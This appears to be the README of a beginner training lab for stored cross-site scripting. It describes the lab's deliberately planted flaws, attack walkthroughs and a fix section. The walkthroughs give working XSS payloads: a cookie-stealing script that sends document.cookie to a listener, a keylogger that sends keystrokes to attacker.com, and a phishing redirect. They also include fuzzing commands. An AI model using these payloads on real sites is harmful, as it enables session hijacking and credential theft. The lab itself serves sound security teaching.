# Lab 05 — Stored XSS (Cross-Site Scripting) 🔴

**Port:** `8005`  
**Stack:** Node.js + MySQL  
**Difficulty:** Beginner

---

## 🕳️ Security Loopholes

### 1. Unsanitized Comment Storage and Rendering
Comment `body` and `author` fields are stored raw and directly interpolated into HTML with no encoding or sanitization.

### 2. No Content-Security-Policy Header
Without CSP, the browser will execute any inline script injected by an attacker.

### 3. Profile Bio XSS
The `/profile/:userId` endpoint also renders `bio` and `website` raw — a second persistent injection point.

### 4. Reflected Session Token
The page reflects `req.headers.cookie` back into the HTML body — making session hijacking even easier.

---

## 🎯 Attack Scenarios

### Scenario A — Classic Alert Proof of Concept
```bash
docker compose up -d

# Inject XSS payload via comment
curl -X POST http://localhost:8005/posts/1/comments \
  -d "author=Attacker&body=<script>alert('XSS')</script>"

# Visit the page in browser to trigger
open http://localhost:8005/posts/1
```

### Scenario B — Session Cookie Theft (Credential Hijacking)
```bash
# Step 1: Set up a listener (simulate attacker's server)
nc -lvnp 9999 &

# Step 2: Inject cookie-stealing payload
curl -X POST http://localhost:8005/posts/1/comments \
  -d "author=hacker&body=<script>fetch('http://host.docker.internal:9999/steal?c='+document.cookie)</script>"

# Step 3: When any user (including admin) views the post, their cookie is sent to attacker
open http://localhost:8005/posts/1
```

### Scenario C — Keylogger Injection
```bash
curl -X POST http://localhost:8005/posts/1/comments \
  -d 'author=test&body=<script>document.addEventListener("keypress",function(e){fetch("http://attacker.com/log?k="+e.key)})</script>'
```

### Scenario D — Profile Bio Defacement / Phishing
```bash
# Inject redirect payload into profile bio
curl -X PUT http://localhost:8005/profile/1 \
  -H "Content-Type: application/json" \
  -d '{"bio": "<script>window.location=\"http://phishing-site.com\"</script>", "website": "javascript:alert(document.cookie)"}'

open http://localhost:8005/profile/1
```

### Scenario E — Automated XSS Discovery
```bash
# Use dalfox to scan for XSS
dalfox url http://localhost:8005/posts/1

# Use ffuf to fuzz comment body field
ffuf -u http://localhost:8005/posts/1/comments \
  -X POST \
  -d "author=test&body=FUZZ" \
  -w /usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -mr "<script>"
```

---

## 🛠️ Tools

| Tool | Command |
|------|---------|
| `dalfox` | `dalfox url http://localhost:8005/posts/1` |
| `Burp Suite` | Intercept POST, replay with XSS payloads |
| Browser DevTools | Check if script executes on page load |
| `xsshunter` | Blind XSS detection platform |

---

## 🔐 How to Fix

```javascript
const he = require('he'); // HTML encoding library

// Encode all user-supplied data before rendering
const commentHtml = comments.map(c => `
  <div class="comment">
    <strong>${he.encode(c.author)}</strong>: ${he.encode(c.body)}
  </div>
`).join('');

// Set Content-Security-Policy header
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy',
    "default-src 'self'; script-src 'self'; object-src 'none'");
  res.setHeader('X-XSS-Protection', '1; mode=block');
  next();
});

// Use a proper templating engine with auto-escaping (e.g., Handlebars, Pug)
// Never concatenate user data into HTML strings
// Validate and whitelist the `website` field (must start with https://)
// Set HttpOnly and Secure flags on cookies
```
